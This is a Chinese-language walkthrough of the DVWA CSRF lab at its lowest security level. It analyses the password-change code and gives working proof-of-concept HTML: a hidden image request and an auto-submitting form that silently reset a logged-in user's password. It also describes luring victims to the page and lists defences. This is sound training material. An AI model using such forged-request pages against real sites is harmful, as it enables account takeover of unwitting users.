# DVWA CSRF (Low) 通关 WriteUp

## 一、漏洞概述

**CSRF（Cross-Site Request Forgery，跨站请求伪造）** 是一种迫使已登录用户在不知情的情况下执行非预期操作的攻击方式。攻击者利用受害者已认证的会话，伪造一个合法请求发送给服务器，服务器误以为是受害者本人操作，从而执行敏感动作。

DVWA 的 **CSRF** 模块模拟了一个修改密码的功能。Low 级别没有任何防护措施，攻击者可以轻松构造恶意页面诱导受害者点击，从而修改其密码。

将 DVWA 安全级别设置为 **Low**，进入 **CSRF** 模块。

## 二、源码分析

查看 Low 级别源码：

```php
<?php
if (isset($_GET['Change'])) {
    $pass_new  = $_GET['password_new'];
    $pass_conf = $_GET['password_conf'];

    if ($pass_new == $pass_conf) {
        $pass_new = mysqli_real_escape_string($connection, $pass_new);
        $pass_new = md5($pass_new);
        $insert = "UPDATE users SET password = '$pass_new' WHERE user = 'admin';";
        $result = mysqli_query($connection, $insert);
        if ($result) {
            echo "<pre>Password Changed.</pre>";
        }
    } else {
        echo "<pre>Passwords did not match.</pre>";
    }
}
?>
```

关键点：

1. 修改密码通过 **GET** 请求完成，参数为 `password_new`、`password_conf` 和 `Change`。
2. 没有 CSRF Token。
3. 没有检查 `Referer` 头。
4. 没有要求输入原密码。
5. 只要受害者已登录，任何构造的请求都会被服务器接受并执行。

## 三、手工利用流程

### 1\. 正常修改密码

在 DVWA 页面输入新密码和确认密码，点击 Change，URL 变为：

```text
http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change
```

页面提示 `Password Changed.`，密码修改成功。

### 2\. 构造恶意页面

攻击者创建一个 HTML 文件，例如 `csrf_low.html`：

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Low PoC</title>
</head>
<body>
    <h1>正在加载...</h1>
    <img src="http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
</body>
</html>
```

原理：`<img>` 标签的 `src` 会自动发起 GET 请求。由于受害者浏览器中保存着 DVWA 的会话 Cookie，请求会携带该 Cookie，服务器认为这是合法操作，从而将密码修改为 `hacked`。

也可以使用隐藏表单自动提交：

```html
<!DOCTYPE html>
<html>
<body onload="document.csrf_form.submit()">
    <form name="csrf_form" action="http://靶机IP/dvwa/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="hacked">
        <input type="hidden" name="password_conf" value="hacked">
        <input type="hidden" name="Change" value="Change">
    </form>
</body>
</html>
```

### 3\. 诱导受害者访问

攻击者将 `csrf_low.html` 放在自己的服务器上，或者通过社工手段让受害者访问。例如：

```text
http://攻击者IP/csrf_low.html
```

受害者已登录 DVWA 的情况下打开该页面，浏览器会静默发送请求，密码被修改为 `hacked`。

### 4\. 验证攻击成功

攻击者使用 `admin` / `hacked` 登录 DVWA，如果能成功登录，说明 CSRF 攻击成功。

> 注意：修改密码后，原密码 `password` 失效。实验完成后可以在 DVWA 页面点击 “Reset Database” 恢复。

## 四、Burp Suite 验证

可以用 Burp Suite 生成 CSRF PoC：

1. 正常提交修改密码请求，用 Burp 拦截。
2. 右键请求 -> `Engagement tools` -> `Generate CSRF PoC`。
3. Burp 会自动生成一个包含自动提交表单的 HTML 页面。
4. 将生成的 HTML 保存为文件，在浏览器中打开，观察是否成功修改密码。

## 五、漏洞成因与防御

**成因**：

1. 敏感操作通过 GET 请求完成，容易被图片、链接等方式触发。
2. 没有 CSRF Token 验证请求来源。
3. 没有检查 Referer。
4. 没有要求用户输入原密码。

**防御措施**：

1. **使用 CSRF Token（首选）**  
   在表单中加入随机生成的 Token，服务器端验证 Token 是否匹配。Token 应绑定用户会话，且一次性使用或有时效性。
   ```php
    $_SESSION['token'] = bin2hex(random_bytes(32));
   ```
2. **敏感操作使用 POST 而非 GET**  
   避免通过 URL 直接触发敏感操作。
3. **检查 Referer / Origin 头**  
   验证请求来源是否来自本站。但 Referer 可能被伪造或缺失，只能作为辅助手段。
4. **要求输入原密码**  
   修改密码、邮箱等敏感操作时，要求用户提供原密码或二次认证。
5. **设置 Cookie 的 SameSite 属性**  
   将会话 Cookie 设置为 `SameSite=Lax` 或 `SameSite=Strict`，限制跨站请求携带 Cookie。
   ```php
    session_set_cookie_params(['samesite' => 'Strict']);
   ```

## 六、总结

CSRF Low 级别没有任何防护，攻击者只需构造一个自动发起 GET 请求的页面，诱导已登录用户访问，即可修改其密码。核心问题在于敏感操作缺乏 Token 验证和请求来源校验。防御应以 CSRF Token 为主，配合 SameSite Cookie 和 POST 提交。